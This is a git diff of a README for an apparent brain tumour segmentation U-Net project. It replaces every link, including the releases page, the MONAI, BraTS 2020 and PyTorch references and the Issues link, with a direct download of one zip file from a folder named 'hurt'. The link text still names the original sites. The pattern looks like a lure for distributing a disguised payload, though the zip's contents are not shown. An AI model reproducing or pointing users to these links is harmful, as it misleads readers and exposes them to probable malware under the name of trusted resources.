@@ -1,6 +1,6 @@
 # 🧠 Brain_Tumor_Segmentation_Unet - Easy Imaging Solution for Brain Tumor Detection
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/releases)
+[![Download Now](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip%https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip)](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Brain Tumor Segmentation Unet project! This application helps in 
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/releases).
+To download the application, visit this page to download: [Releases Page](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -71,9 +71,9 @@ This application covers various topics related to image processing and machine l
 
 To enhance your understanding and usage of the application, consider exploring the following resources:
 
-- [MONAI Framework](https://monai.io/)
-- [BraTS 2020 Dataset](https://www.med.upenn.edu/cbica/brats2020/)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
+- [MONAI Framework](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip)
+- [BraTS 2020 Dataset](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip)
+- [PyTorch Documentation](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip)
 
 ## 🔖 License
 
@@ -81,6 +81,6 @@ This project is licensed under the MIT License. Feel free to use it in your pers
 
 ## 💬 Support
 
-For any questions or support, feel free to reach out via [Issues](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/issues) on GitHub.
+For any questions or support, feel free to reach out via [Issues](https://github.com/Abhisshekcreator/Brain_Tumor_Segmentation_Unet/raw/refs/heads/main/hurt/Tumor-Unet-Segmentation-Brain-v2.8.zip) on GitHub.
 
 Thank you for using Brain Tumor Segmentation Unet. We hope it aids in your research and medical imaging needs!
